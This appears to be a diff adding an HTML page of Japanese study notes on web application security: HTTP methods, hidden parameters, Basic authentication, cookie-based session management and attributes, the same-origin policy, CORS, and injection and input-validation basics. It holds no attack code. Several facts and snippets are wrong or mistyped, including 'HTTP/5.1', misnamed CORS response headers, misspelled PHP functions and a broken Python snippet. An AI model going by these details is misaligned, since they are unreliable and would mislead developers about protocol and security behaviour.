+                <h3 id="25-getとpostの使い分け">2.5 GETとPOSTの使い分け</h3>
+                <p>GETメソッドとPOSTメソッドの使い分けのガイドラインとして以下のようなものが示されています。</p>
+                <ul>
+                <li><strong>GETメソッドは参照(リソース取得)のみに用いる</strong></li>
+                <li><strong>GETメソッドは副作用(リソース取得以外の作用)がないことが期待される</strong></li>
+                <li><strong>秘密情報の送信にはPOSTメソッドを用いること</strong></li>
+                </ul>
+                <p><strong>副作用</strong>の例としては「サーバ側でのデータ追加、更新、削除がおきる作用」があります。これらのような更新系にはPOSTメソッドを用いる必要があります。
+                また、GETメソッドはURLにクエリ文字列の形でパラメータを渡しますが、<strong>ブラウザやサーバが処理できるURL長には上限がある</strong>ため、データ量が多い場合はPOSTメソッドを使う方が安全である。
+                秘密情報をPOSTで送信すべき理由はGETの場合で送信すると以下のような場合があるためである。</p>
+                <ul>
+                <li>URL上に指定されたパラメータがReferer経由で漏洩する</li>
+                <li>URL上に指定されたパラメータがアクセスログに残る</li>
+                <li>URL上のパラメータがブラウザのアドレスバーに表示され他人に覗かれる</li>
+                <li>パラメータつきのURLを利用者がSNSなどで共有してしまう</li>
+                </ul>
+                <p>まとめると、これらが以下の項目で1つでも当てはまる場合はPOSTメソッドを用い、そうでない場合はGETメソッドを利用すべきであると言える。</p>
+                <ul>
+                <li>データ更新などの副作用を伴うリクエストの場合</li>
+                <li>秘密情報を送信する場合</li>
+                <li>送信するデータの総量が多い場合</li>
+                </ul>
+                <h3 id="26-hiddenパラメータの危険性">2.6 hiddenパラメータの危険性</h3>
+                <p>HTMLにおいてデータの受け渡しにhiddenパラメータは使われます。</p>
+                <pre><code class="language-html">&lt;form&gt;
+                  &lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;value&quot;&gt;
+                &lt;/form&gt;
+                </code></pre>
+                <p>これはHTMLの表示として見えなくてもHTML文書上には記述されます。
+                HTTPはクライアントの状態を覚えておく設計になっていません(**HTTPのステートレス性)**。
+                そのためレスポンス内のhiddenパラメータに状態を記録します。</p>
+                <p>HTTPというレイヤー下においては、hiddenパラメータと同じように、テキストボックスやラジオボタンの選択肢も
+                ブラウザで見る画面上では変更できない値は<strong>利用者が書き換え可能</strong>であると言えます。</p>
+                <h4 id="hiddenパラメータのメリット">hiddenパラメータのメリット<!-- omit in toc --></h4>
+                <p>hiddenパラメータは利用者が書き換えできる特徴もあるが、<strong>情報漏洩や第3者の書き換えに対しては堅牢</strong>でもあります。
+                hiddepnパラメータや後述にあるセッション変数やクッキーのメリットとデメリットをまとめます。</p>
+                <table>
+                <thead>
+                <tr>
+                <th>種類</th>
+                <th>メリット</th>
+                <th>デメリット</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>hiddenパラメータ</td>
+                <td>情報漏洩や第3者の書き換えに対しては堅牢</td>
+                <td>利用者が書き換え可能</td>
+                </tr>
+                <tr>
+                <td>セッション変数</td>
+                <td>利用者自身の書き換えが難しい</td>
+                <td>セッションIDの固定化攻撃に弱い</td>
+                </tr>
+                <tr>
+                <td>クッキー</td>
+                <td></td>
+                <td>セッションIDの固定化攻撃に弱い</td>
+                </tr>
+                </tbody></table>
+                <p>これらの特徴から、利用者により書き換えられて困る認証や認可に関する情報はセッション変数を用い、それ以外は基本的にhiddenパラメータを用いるとよい。
+                とくにログイン前の状態ではセッション変数の利用は避け、hiddenパラメータを用いることが情報漏洩に対して安全である。</p>
+                <h3 id="27-http認証">2.7 HTTP認証</h3>
+                <p>HTTPには認証機能がサポートされており、HTTP認証と称されます。
+                種類にはBASIC認証、NTLM認証、Digest認証などがあります。
+                HTTPがステートレスであるように、HTTP認証もステートレスとなっています。</p>
+                <h4 id="basic認証">Basic認証<!-- omit in toc --></h4>
+                <p>Basic認証は特定のディレクトリに設定をすることでIDとパスワードがなければそのディレクトリ以下のコンテンツを閲覧できなくすることができる機能です。
+                この仕組みはWebサーバの設定でも実現できる場合が多いが、各種フレームワークや言語の機能で実装できる場合もあります。</p>
+                <img src="https://www.itra.co.jp/uploads/media/2020/05/20200530131051.jpg" width="50%">
+                
+                <p>Basic認証において、ユーザ名やID、パスワードを入力し認証ボタンを押すとHTTPリクエストには以下のようなヘッダが付与されます。
+                例</p>
+                <pre><code class="language-bash">Authorization: Basic dXNlcjE6cGFzcE=
+                </code></pre>
+                <p>Basic後ろの文字列はIDやパスワードをコロン「:」で区切りつなげ、Basic64エンコードしたものです。
+                一度Basic認証に成功すると、Basic認証を指定したディレクトリへのリクエストにはブラウザが自動的にAuthorizationヘッダを付与します。
+                そのため見かけ上では認証状態が保持されているように見えても、リクエスト毎にIdとパスワードが送信されており、認証状態自体はどこにも保存されていない。
+                そのためBasic認証はステートレスであり、ログアウトという概念も存在しません。
+                ちなみにBasic認証をログアウトのような状態にするにはBasic認証のキャッシュを削除します。
+                具体的にはURLがexample.comの場合「https://<strong>me@</strong> exapmple.com」のようにすることでその認証をしたブラウザでログアウトのような状態にすることが可能です。</p>
+                <h3 id="28-cookieとセッション管理">2.8 Cookieとセッション管理</h3>
+                <p>セッション管理とはクライアントとサーバー間でその情報を保持し、アクセス制御を一つの集合体として管理する仕組みである。
+                このセッション管理をHTTPで実現する目的でCookieという仕組みがある。Cookieはセッション管理という機能の実現に使われています。
+                具体的にCookieはサーバ側からブラウザに対して「名前=変数」の組を覚えておくように指示するものです。</p>
+                <p>session_startを組み込んであるWebページ(例:ログイン画面等)のレスポンスヘッダでは、以下にように記述されます。
+                例</p>
+                <pre><code class="language-bash">HTTP/5.1 200 OK
+                Set-Cookie: PHPSESSID-gg5144evrhmdialeksjn45ndkjb53; path=/
+                Content-Length: 279
+                Content-Type: thxt/html; charset=UTF-8
+                
+                &lt;html&gt;
+                </code></pre>
+                <p>このレスポンスヘッダの「<strong>Set-Cookie</strong>」により、Webサーバはブラウザに対してクッキー値を覚えるように指示します。
+                また、各入力値(ログインIDやパスワード)を入力しボタンを押すと、以下のようなHTTPリクエストがブラウザからサーバに送信されます。
+                例</p>
+                <pre><code class="language-bash">POST /31/31-021.php HTTP/5.1
+                Referer: http://exapmle.com/31/31-020.php
+                Content-Type: application/x-www-form-urlencoded
+                Host: example.com
+                Content-Length: 18
+                Cookie: PHPSESSID=gg55427jsbhj232sjb2asjn
+                
+                ID=user1&amp;PWD=pass1
+                </code></pre>
+                <p>クッキー値を覚えたブラウザは、その後同一のサイト(例の場合:example.com)にリクエストを送信する際に
+                覚えたクッキー値(PHPSESSID=...)を送信します。なお、クッキーには有効期限が設定可能ですが、指定しない場合はブラウザを終了するまで有効です。
+                例の場合、PHPSESSIDのクッキー値は<strong>セッションID</strong>と呼ばれます。セッション情報にアクセスするためのキー情報をとなります。</p>
+                <h4 id="cookieによるセッション管理">Cookieによるセッション管理</h4>
+                <p>CookieはWEBサイトを閲覧したときに、訪問者が訪れたサイトや入力したデータ、利用環境などの情報が記録されたファイル（仕組み）である。
+                クッキーは少量のデータをブラウザで覚えておけるものですが、アプリケーションデータを保持する目的でクッキーそのものに値を入れることはあまりしない。</p>
+                <ul>
+                <li>クッキーが保持できる値の個数や文字列長には制限がある</li>
+                <li>クッキー値は利用者本人から参照・変更できるため、秘密情報の格納には不向き</li>
+                </ul>
+                <p>このため、多くの場合クッキーには「<strong>整理番号</strong>」としてセッションIDを格納し、実際の値はサーバ側で管理する方法が用いられます。これは<strong>クッキーによるセッション管理</strong>と呼ばれます。
+                またセッションIDは連番の場合なりすましされる場合があるため、<strong>十分な桁の乱数</strong>を用います。
+                セッションIDに求められる要件には以下のようなものがあります。</p>
+                <ol>
+                <li>第3者がセッションIDを推測できないこと</li>
+                <li>第3者からセッションIDが強制されないこと</li>
+                <li>第3者にセッションIDが漏洩しないこと</li>
+                </ol>
+                <p>1の要件を満たすのは乱数の質が要求されます。乱数に規則性がある場合、セッションIDを収集することで他人のセッションIDが推測できる場合があります。その対策として、セッションIDは暗号論的疑似乱数生成器を用いて生成します。この高度な乱数生成器の例は電子政府推奨暗号リスト(<a href="http://www.cryptrec.go.jp/list.html">http://www.cryptrec.go.jp/list.html</a> )に一覧が記載されています。
+                実際の開発ではセッションIDを自作するのではなく、各種WEB開発ツール(PHP,Laravel,Rails,.Net....)で提供されるセッションIDが利用されます。
+                基本的にセッション管理機構は自作しないことが重要です。</p>
+                <h4 id="cookieの種類">Cookieの種類</h4>
+                <p>WEBサイトを利用しやすいものにするCookieにはファーストパーティとサードパーティの2種類があります。</p>
+                <ul>
+                <li><strong>ファーストパーティCookie</strong> ・・・ 訪れたサイトから直接発行されるCookie(ログイン状態の記憶やショッピングカートの中身保存など)</li>
+                <li><strong>サードパーティCookie</strong> ・・・ 第三者のドメインから発行されるCookie(ユーザーの追跡(Web広告に利用):Googleは2023年に廃止を目指す)</li>
+                </ul>
+                <p>Cookieとキャッシュの違いは以下の通りです。</p>
+                <table>
+                <thead>
+                <tr>
+                <th></th>
+                <th>仕組み</th>
+                <th>備考</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>Cookie</td>
+                <td>・IDやパスワードなどの個人情報やサイトの閲覧情報を保存</td>
+                <td>・削除するとログインする時に再入力する必要がある ・個人情報などが漏洩する危険性がある。</td>
+                </tr>
+                <tr>
+                <td>キャッシュ</td>
+                <td>・サイトのHTMLや画像データを保存 ・データはスマホやPC内に保存される</td>
+                <td>・削除しても、再入力なしでログインできる ・キャッシュのデータが増えることでメモリの空き容量がなくなり、動作不良の原因になる</td>
+                </tr>
+                </tbody></table>
+                <h4 id="セッションidの固定化攻撃sfa">セッションIDの固定化攻撃(SFA)</h4>
+                <p>この攻撃は、攻撃者が正規利用者に対してセッションIDを強制する攻撃です。</p>
+                <img src="https://www.sc-siken.com/kakomon/29_haru/img/05.gif" width="50%">
+                
+                <p>これを防ぐには<strong>認証されたタイミングでセッションIDを変更する</strong>ことで実現できます。</p>
+                <h4 id="セッションid漏洩の原因">セッションID漏洩の原因</h4>
+                <p>セッションIDが漏洩した場合、他の利用者になりすましができるため対策を講じる必要があります。
+                セッションIDが漏洩する原因には以下のようなものがあります。</p>
+                <ul>
+                <li>クッキー発行の際の属性に不備がある</li>
+                <li>ネットワーク上でセッションIDが盗聴される</li>
+                <li>クロスサイトスクリプティングなどのアプリの脆弱性により漏洩する</li>
+                <li>開発機能(PHP,Rails...)やブラウザなどのプラットホームの脆弱性により漏洩する</li>
+                <li>セッションIDをURLに保持する場合に、Refererヘッダより流失する</li>
+                </ul>
+                <p>セッションIDがネットワーク上で盗聴される場所は公的無線LAN(Free Wifi)などです。
+                セッションIDをネットワーク上の盗聴から保護するにはTLSによる暗号化が有効です。その際にクッキーを発行する属性指定に注意する必要があります。</p>
+                <h4 id="cookieの属性">Cookieの属性</h4>
+                <p>クッキーを発行する際に、オプション属性を設定できます。主な属性は以下の通りです。
+                セキュリティ上重要な属性は、<strong>「Domain」「Secure」「HttpOnly」</strong> の３つです。</p>
+                <table>
+                <thead>
+                <tr>
+                <th>属性</th>
+                <th>意味</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>Domain</td>
+                <td>ブラウザがクッキー値を送信するサーバのドメイン</td>
+                </tr>
+                <tr>
+                <td>Path</td>
+                <td>ブラウザがクッキー値を送信するURLのディレクトリ</td>
+                </tr>
+                <tr>
+                <td>Expires</td>
+                <td>クッキー値の有効期限、指定なしの場合ブラウザ終了まで</td>
+                </tr>
+                <tr>
+                <td>Secure</td>
+                <td>HTTPSの場合のみクッキーを送信</td>
+                </tr>
+                <tr>
+                <td>HttpOnly</td>
+                <td>JavaScriptでクッキーを取得できないようにする</td>
+                </tr>
+                </tbody></table>
+                <h4 id="cookieのdomain属性">CookieのDomain属性</h4>
+                <p>クッキーはデフォルトではクッキーをセットしたサーバのみに送信されます。
+                Domain属性は、「複数のサーバに送信されるクッキーを生成したい場合」に使用します。
+                Domain名を指定した場合、例えば「example.com」を指定したとするとサブドメインにもクッキーが送信されることとなります。
+                そのため<strong>Domain属性は原則指定しない</strong>のがルールとなります。</p>
+                <h4 id="cookieのsecure属性">CookieのSecure属性</h4>
+                <p>Secure属性はHTTPSの通信の場合のみサーバに送信されます。この属性はHTTPS送信を保証する目的で指定されます。</p>
+                <h4 id="cookieのhttponly属性">CookieのHttpOnly属性</h4>
+                <p>HttpOnly属性は、JavaScriptからアクセスできないクッキーを設定するものです。
+                クッキーとして格納されたセッションIDを盗み出す攻撃にはクロスサイトスクリプティングがあり、これはJavaScriptを悪用してクッキーを盗み出すものです。
+                HttpOnly属性のみでクロスサイトスクリプティングは防げませんが、攻撃を難しくできるため、セッションIDに<strong>HttpOnly属性をつける</strong>ことが推奨されます。</p>
+                <h4 id="cookieのsamesite属性">CookieのSameSite属性</h4>
+                <p>最近のブラウザにはCSRF脆弱性対策としてSameSite属性が機能として追加されています。
+                sameSite属性には値としてStrict(厳しい),Lax(緩い),None(なし)が指定できます。
+                通常は<strong>SameSite=Laxを指定します</strong>。この結果として他サイトからPOSTメソッドで遷移した場合はクッキーは送信されなくなります。</p>
+                <hr>
+                <h2 id="3受動攻撃と同一オリジンポリシ">3.受動攻撃と同一オリジンポリシ</h2>
+                <h3 id="31-能動攻撃と受動攻撃">3.1 能動攻撃と受動攻撃</h3>
+                <p>Webを用いた攻撃手段には能動攻撃と受動攻撃に分類されます。</p>
+                <h4 id="能動攻撃">能動攻撃</h4>
+                <p>能動攻撃は攻撃者がWebサーバに直接攻撃することです。
+                代表例としてはSQLインジェクション攻撃があります。</p>
+                <h4 id="受動攻撃">受動攻撃</h4>
+                <p>受動攻撃は攻撃者がサーバを直接攻撃するのではなく、Webサイトの利用者にわなを仕掛けることにより、罠を閲覧したユーザを通しWebアプリを攻撃する手法です。</p>
+                <h5 id="単純な受動攻撃">単純な受動攻撃</h5>
+                <p>単純な受動攻撃例としては「罠サイトに利用者を誘導するパターン」があります。
+                このケースでは怪しいサイトを閲覧してマルウェアに感染する場合です。
+                ブラウザ本体や各種アプリケーションの脆弱性をついた攻撃となる場合がほとんどです。</p>
+                <h5 id="正規サイトを悪用した受動攻撃">正規サイトを悪用した受動攻撃</h5>
+                <p>このタイプの攻撃では以下のようなステップを踏みます。</p>
+                <ol>
+                <li>攻撃者はあらかじめ正規サイトを攻撃しコンテンツに仕掛けを仕組む</li>
+                <li>サイト利用者が仕掛けを含むコンテンツを取得し閲覧する</li>
+                <li>サイト利用者の端末にマルウェアが感染する</li>
+                </ol>
+                <p>この手法では下記の4種類が多いです。</p>
+                <ul>
+                <li>FTPなどのパスワードを不正入手しコンテンツを書き換える</li>
+                <li>Webサーバの脆弱性をついた攻撃によりコンテンツを書き換える</li>
+                <li>SQLインジェクション攻撃によりコンテンツを書き換える</li>
+                <li>SNSなどの利用者が投稿可能なサイト機能のクロスサイトスクリプティング脆弱性を悪用する</li>
+                </ul>
+                <h5 id="サイトをまたがった受動攻撃">サイトをまたがった受動攻撃</h5>
+                <p>このタイプの攻撃は罠サイトと正規サイトをまたがった攻撃です。
+                例としては以下のようなステップがあります。</p>
+                <ol>
+                <li>利用者が罠サイトを閲覧する</li>
+                <li>罠サイトから仕掛けを含むHTMLをダウンロードする</li>
+                <li>HTMLの仕掛けが発動し正規サイトに攻撃のレスポンスを送信する</li>
+                <li>正規サイトからJavaScriptなどの仕掛けを含むレスポンスが返送される</li>
+                </ol>
+                <p>このタイプの攻撃は正規サイトにログインしている利用者のアカウントを悪用した攻撃です。
+                このタイプの攻撃例には以下のようなものがあります。</p>
+                <ul>
+                <li>CSRF(:項目3による攻撃のタイプ)</li>
+                <li>XSS・HTTPヘッダインジェクション(:項目4の攻撃のタイプ)</li>
+                </ul>
+                <h3 id="32-ブラウザで受動攻撃を防ぐ方法">3.2 ブラウザで受動攻撃を防ぐ方法</h3>
+                <p>受動攻撃に関してはブラウザやWebサイトそれぞれで対策を行う必要があります。</p>
+                <h4 id="ブラウザでのセキュリティ機能">ブラウザでのセキュリティ機能</h4>
+                <h5 id="サンドボックス">サンドボックス<!-- omit in toc --></h5>
+                <p>ブラウザ上では利用者の安全性を高めるための機能を提供しています。</p>
+                <ul>
+                <li>利用者に配布元を確認させた上で許可した場合のみ実行する</li>
+                <li>プログラムのできることを制限するサンドボックス環境を用意する</li>
+                </ul>
+                <p>サンドボックスはJavaScriptやAdobe Flash playerなどで採用されている考え方であり、プログラムにできることを制限を付けることで悪意のあるプログラムから利用者を守るように配慮されています。</p>
+                <h5 id="javascriptのサンドボックス">JavaScriptのサンドボックス<!-- omit in toc --></h5>
+                <p>JavaScriptのサンドボックスでは以下のように機能が制限されます。</p>
+                <ul>
+                <li>ローカルファイルへのアクセス禁止</li>
+                <li>プリンタなどの資源の利用禁止</li>
+                <li>ネットワークアクセスの制限(<strong>同一オリジンポリシ</strong>)</li>
+                </ul>
+                <h4 id="同一オリジンポリシ">同一オリジンポリシ</h4>
+                <p>同一オリジンポリシは、JavaScriptなどのクライアントスクリプトからサイトをまたがったアクセスを禁止するセキュリティ上の制限であり、ブラウザのサンドボックスに提供された機能の1つです。
+                簡単に言うと、<strong>「JavaScript で自由にやりとりできるところは、その JavaScript をとってきたところと同一の場所だけに制限する」</strong> ということです。</p>
+                <h4 id="同一オリジンである条件">同一オリジンである条件</h4>
+                <p>同一オリジンを満たすのは下記条件の全てを満たす場合です。</p>
+                <ul>
+                <li>URLのホストが一致している</li>
+                <li>スキーム(プロトコル)が一致している</li>
+                <li>ポート番号が一致している</li>
+                </ul>
+                <p>同一オリジンポリシによる保護対象にはiframe内の要素にとどまらず、Ajaxに使用されるXMLHttpRequestオブジェクトでアクセスできるURLなどにも及びます。XMLHttpRequestに関しては相手の許可があれば同一オリジンでなくても通信可能なCORSという規格が策定されました。</p>
+                <h4 id="アプリケーション脆弱性と受動攻撃">アプリケーション脆弱性と受動攻撃</h4>
+                <p>ブラウザは同一オリジンポリシにより受動攻撃を阻止していますが、アプリケーションに脆弱性があると受動攻撃を受ける場合があります。
+                その代表例に「クロスサイトスクリプティング(XSS)攻撃」があります。
+                XSSは同一オリジンポリシをかいくぐった攻撃手法であり、iframeの外側のスクリプトで内側をアクセスしようとした場合は同一オリジンポリシ違反でアクセス拒否されますが、何らかの手法によりiframeの内側にJavaScriptを送り込み実行させ同一オリジンポリシをかいくぐります。</p>
+                <h3 id="33-javascript以外でのクロスドメインアクセス">3.3 JavaScript以外でのクロスドメインアクセス</h3>
+                <p>JavaScript以外のブラウザ機能で、クロスドメインアクセスが許可されているものには以下のようなものがあります。</p>
+                <h4 id="frame要素とiframe要素">frame要素とiframe要素</h4>
+                <p>frame要素とiframe要素はクロスドメインアクセスができます。
+                ただし<strong>JavaScriptのよるクロスドメインのドキュメントにアクセスすることは禁止されています</strong>。</p>
+                <h4 id="img要素">img要素</h4>
+                <p>img要素のsrc属性はクロスドメインの指定が可能です。
+                またHTML5のcanvas要素を用いると、JavaScriptにより画像の中身にアクセスできますが、この場合はCORSと同一オリジンポリシの制約を受けます。
+                そのためクロスドメインの画像参照が問題になることは基本的にはない。</p>
+                <h4 id="script要素">script要素</h4>
+                <p>scriptの要素にsrc属性を指定すると他サイトからJavaScriptを読み込むことができます。</p>
+                <h4 id="css">CSS</h4>
+                <p>CSSはクロスドメインでの読み込みが可能な他、HTMLではlink要素で、CSSでは@importで、JavaScriptではaddImportメソッドで可能です。</p>
+                <h4 id="form要素のaction属性">form要素のaction属性</h4>
+                <p>form要素のaction属性でもクロスドメインの指定が可能です。
+                また、formのsubmitはJavaScriptから常に操作できます。このformの特性を悪用した攻撃手法にはクロスサイトリクエストフォージェリ(CSFR)攻撃があります。CRSF攻撃ではユーザの意図しないformを送信させられ、アプリケーションの機能が勝手に実行されます。</p>
+                <h3 id="34-corscross-origin-resource-sharing">3.4 CORS(Cross Origin Resource Sharing)</h3>
+                <p>CORSは同一オリジンポリシーによって設けられた制限を緩めるものです。
+                具体的には、HTTP ヘッダーの転送で構成されるシステムであり、ブラウザーがオリジンをまたいだリクエストのレスポンスに、フロントエンドの JavaScriptがアクセスすることをブロックするかどうかを決めるものです。
+                CORS で定義された方法に従えば、たとえ同一オリジンでなくても、fetchやXMLHttpRequest (XHR)などJavaScript による自由なリソース取得が許可されます。
+                CORS ではリクエストの種類がシンプルリクエストとプリフライトリクエストの2種類に分けられています。
+                シンプルリクエストとプリフライトリクエストのレスポンスヘッダに共通して記述するものにAccsess Control Allow Originがあります。</p>
+                <pre><code class="language-bash">Access-Control-Allow-Origin: https://example.com
+                </code></pre>
+                <h4 id="シンプルリクエスト">シンプルリクエスト</h4>
+                <p>シンプルリクエストといわれるのは下記メソッドです。</p>
+                <ul>
+                <li>GET</li>
+                <li>POST</li>
+                <li>HEAD</li>
+                </ul>
+                <h4 id="プリフライトリクエスト">プリフライトリクエスト</h4>
+                <p>プリフライトリクエストは、リクエストの始めにOPTIONS メソッドで対象の異なるオリジンにリクエストを送り、実際のリクエストを送っても問題ないか確認します。該当するリクエストは以下になります。</p>
+                <ul>
+                <li>PUT</li>
+                <li>DELETE</li>
+                <li>CONNECT</li>
+                <li>OPTIONS</li>
+                <li>TRACE</li>
+                <li>PATCH</li>
+                </ul>
+                <p>プリフライトリクエストのレスポンスとして、<strong>アクセスを許可するメソッドをレスポンスヘッダーに含める</strong>必要があります。</p>
+                <pre><code class="language-bash">Access-Control-Allow-Methods: POST, PUT, DELETE, PATCH
+                </code></pre>
+                <p>プリフライトリクエストでやり取りするヘッダには以下のようなものがあります。</p>
+                <table>
+                <thead>
+                <tr>
+                <th>要求の種類</th>
+                <th>リクエスト</th>
+                <th>レスポンス</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>メソッドに対する許可</td>
+                <td>Accsess-Control-Request-Method</td>
+                <td>Accsess-Control-Request-Methods</td>
+                </tr>
+                <tr>
+                <td>ヘッダに対する許可</td>
+                <td>Accsess-Control-Request-Headers</td>
+                <td>Accsess-Control-Request-Headers</td>
+                </tr>
+                <tr>
+                <td>オリジンに対する許可</td>
+                <td>Origin</td>
+                <td>Accsess-Control-Request-Origin</td>
+                </tr>
+                </tbody></table>
+                <h4 id="認証情報を含むリクエスト">認証情報を含むリクエスト</h4>
+                <p>通常ではHTTP認証やCookieも含めてリクエストを送りたいという場合、<strong>デフォルトでは異なる Origin に対して送信されません</strong>。 オリジンをまたいでCookieを送りたい場合はレスポンスヘッダに以下の記述を追加します。</p>
+                <pre><code class="language-bash">Access-Control-Allow-Credentials: true
+                </code></pre>
+                <p>例としてXMLHttpRequestを使う場合とFetch APIを使う場合の記述例を示します。</p>
+                <p><strong>●XMLHttpRequestの例</strong></p>
+                <pre><code class="language-javascript">const xhr = new XMLHttpRequest();
+                xhr.withCredentials = true; // ここを追加。
+                </code></pre>
+                <p><strong>●Fetch APIの例</strong></p>
+                <pre><code class="language-javascript">fetch(&#39;https://exapmle.co.jp&#39;, {
+                  mode: &#39;cors&#39;,
+                  credentials: &#39;include&#39; // ここを追加。
+                });
+                </code></pre>
+                <h1 id="機能別のセキュリティバグ">機能別のセキュリティバグ</h1>
+                <h2 id="1脆弱性の発生">1.脆弱性の発生</h2>
+                <h3 id="11-脆弱性の全体像">1.1 脆弱性の全体像</h3>
+                <img src="https://user-images.githubusercontent.com/3749175/37254632-aa9bcd4a-2583-11e8-9bc0-0c4093ebe794.png" width="60%">
+                
+                <p>この関係から以下のことが分かります。</p>
+                <ul>
+                <li>脆弱性には処理に起因するものと出力に起因するものがある</li>
+                <li>入力に起因する脆弱性はない</li>
+                <li>出力に起因する脆弱性には「インジェクション」が多い</li>
+                </ul>
+                <p>Webアプリケーションの脆弱性は機能との関係性が強いことがわかります。</p>
+                <h3 id="12-インジェクション系脆弱性">1.2 インジェクション系脆弱性</h3>
+                <p>Webではテキスト形式のインターフェスを多用します。例えばHTML,HTTP,SQLなどです。
+                これらのテキスト形式は決められた文法により構成され、命令や演算子、データなどが混在します。
+                特にデータの中に「データの終端」を示す記号や命令を混入させて文字列の構造を変化させるものがあります。
+                それらはインジェクション系の攻撃の共通原理であり多用されます。</p>
+                <table>
+                <thead>
+                <tr>
+                <th>脆弱性名</th>
+                <th>インターフェス</th>
+                <th>悪用手段</th>
+                <th>データの終端</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>XSS</td>
+                <td>HTML</td>
+                <td>JavaScriptなどの挿入</td>
+                <td>&lt; &quot; など</td>
+                </tr>
+                <tr>
+                <td>HTTPヘッダインジェクション</td>
+                <td>HTTP</td>
+                <td>HTTPレスポンスヘッダの挿入</td>
+                <td>改行</td>
+                </tr>
+                <tr>
+                <td>SQLインジェクション</td>
+                <td>SQL</td>
+                <td>SQL文の挿入</td>
+                <td>&#39; など</td>
+                </tr>
+                <tr>
+                <td>OSコマンドインジェクション</td>
+                <td>シェルスクリプト</td>
+                <td>コマンドの挿入</td>
+                <td>; | など</td>
+                </tr>
+                <tr>
+                <td>メールメッダインジェクション</td>
+                <td>sendmailコマンド</td>
+                <td>メールメッダ、本文の挿入や改変</td>
+                <td>改行</td>
+                </tr>
+                </tbody></table>
+                <h2 id="2-入力処理系のセキュリティ">2 入力処理系のセキュリティ</h2>
+                <h3 id="21-入力処理の検証">2.1 入力処理の検証</h3>
+                <p>入力処理はHTTPリクエストとして渡されるパラメータ(GET,POST, Cookie)などを指します。
+                入力処理では入力値に対して以下の処理を実行します。</p>
+                <ul>
+                <li><strong>文字エンコーディングの妥当性検証</strong></li>
+                <li><strong>文字エンコーディングの変換(必要な場合)</strong></li>
+                <li><strong>入力値の妥当性検証</strong></li>
+                </ul>
+                <p>文字エンコーディングの妥当性検証を行理由には、文字コードを用いた攻撃手法があるからです。
+                文字エンコーディングの変換が必要な場合はHTTPメッセージとプログラム内部の文字エンコーディングが異なる場合です。
+                入力値の妥当性検証は基本的にはアプリケーションの使用に基づいて行いますが、セキュリティ上の保険のような対策になります。</p>
+                <h3 id="22-文字エンコーディングの検証">2.2 文字エンコーディングの検証</h3>
+                <p>サーバサイドで動かすことの多い、各プログラミング言語(PHP,Ruby,Python)での文字エンコーディングの検証に関して見てみます。</p>
+                <h4 id="●phpの場合">●PHPの場合</h4>
+                <pre><code class="language-php">bool mb_check_encording(string チェック対象の文字列, string 文字エンコーディング)
+                </code></pre>
+                <p>第2引数を省略した場合はPHP内部の文字エンコーディングが使われます。
+                文字列のエンコーディングが正当な場合trueを返します。</p>
+                <h4 id="●rubyの場合">●Rubyの場合</h4>
+                <pre><code class="language-ruby">str = str.encode(文字エンコーディング)
+                puts str
+                </code></pre>
+                <p>変数strはチェック対象の文字列が格納されています。</p>
+                <h4 id="●pythonの場合">●Pythonの場合</h4>
+                <p>chardetモジュールが必要です。</p>
+                <pre><code class="language-python">str = chardet.detect(チェック対象の文字列))
+                print &quot;文字エンコーディング&quot; == str[&quot;encording&quot;]
+                # True or False
+                </code></pre>
+                <h3 id="23-文字エンコーディングの変換">2.3 文字エンコーディングの変換</h3>
+                <p>各言語における文字エンコーディングの変換仕様は以下の通りです。</p>
+                <table>
+                <thead>
+                <tr>
+                <th>言語</th>
+                <th>自動変換</th>
+                <th>スクリプト記述</th>
+                </tr>
+                </thead>
+                <tbody><tr>
+                <td>PHP</td>
+                <td>php.iniなど</td>
+                <td>mb_convert_encording</td>
+                </tr>
+                <tr>
+                <td>Perl</td>
+                <td></td>
+                <td>Encode::decode</td>
+                </tr>
+                <tr>
+                <td>java</td>
+                <td>setCharacterEncording</td>
+                <td>Stringクラス</td>
+                </tr>
+                <tr>
+                <td>Ruby</td>
+                <td></td>
+                <td>Stringクラス</td>
+                </tr>
+                <tr>
+                <td>Python</td>
+                <td></td>
+                <td>chardetライブラリ</td>
+                </tr>
+                </tbody></table>
+                <h3 id="24-入力値の検証">2.4 入力値の検証</h3>
+                <p>入力値の検証のないアプリでは以下のような現象が起こりえます。</p>
+                <ul>
+                <li>数値のみを受け付ける項目に対し、英字や記号を入力しデータベースエラーとなる</li>
+                <li>更新処理が途中でエラーとなりデータベースの不整合が起こる</li>
+                <li>利用者が多数の項目を入力し実行ボタンをクリックしたら内部エラーとなり入力をやり直すはめとなる</li>
+                <li>メールアドレスの入力を忘れている項目があるにもかかわらず、アプリケーションがメール送信処理を実行する</li>
+                </ul>
+                <h4 id="入力値検証とセキュリティ">入力値検証とセキュリティ</h4>
+                <p>入力値検証の目的はセキュリティ対策では基本的にはありませんが、セキュリティ対策となる場合があります。</p>
+                <ul>
+                <li>SQLインジェクション対策が漏れだしたパラメータがあったが、英数字のみ許可したため実害にならない</li>
+                <li>表示処理の関数に文字エンコーディングの指定は行っていないが、入力段階でチェックしているため実害にならない</li>
+                </ul>
+                <h4 id="バイナリセーフとnull-byte攻撃">バイナリセーフとNull Byte攻撃</h4>
+                <p>バイナリセーフは入力値がどんなバイト列でも正しく扱えることを意味します。具体的には0が現れても正しく処理できることを指します。
+                Null ByteはC言語やUnix,Windows APIなどでは文字列の終端とみなす取り決めがあり、それが問題となる場合があります。
+                この問題をついた攻撃としてはNull Byte攻撃が知られています。
+                Null Byte攻撃に対して根本対策を講じることはNull Byteを許容しないパラメータがあるため困難である。
+                そのため、入り口でバイナリセーフ関数を用いて入力値のNull ByteをチェックしNull Byteがあった場合エラーにすることが確実な対応となる。</p>
+                <h4 id="制御文字のチェック">制御文字のチェック</h4>
+                <p>入力値検証で「すべての文字を許可する場合」でも検証できることとしては、制御文字のチェックがあります。
+                制御文字は改行やタブなどの通常表示されない文字です。またNull Byteも制御文字の1つです。
+                input要素のtype属性がtextやpasswordのものは通常では制御文字は入力できないため、これらのフィールドでは制御文字はすべて拒絶できます。
+                一方textarea要素の場合は仕様で改行やタブの入力が可能です。</p>
+                <h4 id="文字数のチェック">文字数のチェック</h4>
+                <p><strong>すべてのパラメータに最大文字数を仕様として定義すべきである</strong>。
